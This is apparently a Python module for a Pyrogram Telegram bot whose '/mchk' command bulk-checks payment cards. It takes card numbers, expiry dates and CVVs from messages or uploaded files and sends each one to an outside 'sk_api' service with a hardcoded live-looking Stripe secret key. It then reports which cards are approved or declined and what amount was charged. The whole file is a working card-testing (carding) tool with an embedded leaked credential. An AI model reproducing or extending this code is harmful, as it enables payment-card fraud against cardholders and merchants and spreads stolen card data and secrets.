import aiohttp
import asyncio
import re
import os
import aiofiles
from pyrogram import filters
from EQUROBOT import app

async def process_credit_card(cc_entry):
    try:
        x = re.findall(r'\d+', cc_entry)
        if len(x) != 4:
            return f'Invalid CC format in entry: {cc_entry}\n'

        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]

        VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
        if not ccn.startswith(VALID):
            return f'Invalid CC type in entry: {cc_entry}\n'

        async with aiohttp.ClientSession() as session:
            url = "https://mvy.ai/sk_api/api.php"
            params = {
                "lista": f"{ccn}:{mm}:{yy}:{cvv}",
                "sk": "sk_live_v6hZVe0J4f3rShGDqOSiwh8v"
            }

            async with session.get(url, params=params) as response:
                r = await response.json()

                if r['status'] == 'die':
                    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
                    return f"{fullcc}\nDECLINED ❌ - {r['message']}\n\n"

                elif r['status'] == 'approved':
                    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"
                    return f"{fullcc}\nBRAINTREE AUTH $5 ✅ - {r['message']} - CHARGED ${r['payment_info']['amount']}\n\n"

                else:
                    return "Unknown status received.\n\n"

    except Exception as e:
        return f"Error processing CC entry: {e}\n"

async def process_credit_cards_in_file(file_path, output_file):
    try:
        async with aiofiles.open(file_path, 'r') as file, aiofiles.open(output_file, 'w') as outfile:
            async for line in file:
                cc_entry = line.strip()
                result = await process_credit_card(cc_entry)
                await outfile.write(result)

    except Exception as e:
        await aiofiles.open(output_file, 'w').write(f"Error reading file: {e}\n")

@app.on_message(filters.command("mchk", prefixes=[".", "/"]))
async def check_cc(_, message):
    command_prefix_length = len(message.text.split()[0])
    cc_entry = message.text[command_prefix_length:].strip()

    reply_msg = message.reply_to_message
    if reply_msg:
        if reply_msg.text:
            cc_entries = reply_msg.text.strip().split('\n')
            results = [await process_credit_card(entry) for entry in cc_entries]
            await message.reply_text("\n\n".join(results))
        elif reply_msg.document:
            file_path = await app.download_media(reply_msg.document.file_id)
            output_file = f"results_{reply_msg.document.file_name}.txt"
            await process_credit_cards_in_file(file_path, output_file)
            os.remove(file_path)
            await message.reply_document(document=output_file)
            os.remove(output_file)
        else:
            await message.reply_text("Unsupported file type.")
            return

    elif cc_entry:
        cc_entries = cc_entry.split('\n')
        results = [await process_credit_card(entry) for entry in cc_entries]
        await message.reply_text("\n\n".join(results))
    else:
        await message.reply_text("Please provide credit card details or reply to a message containing them.")
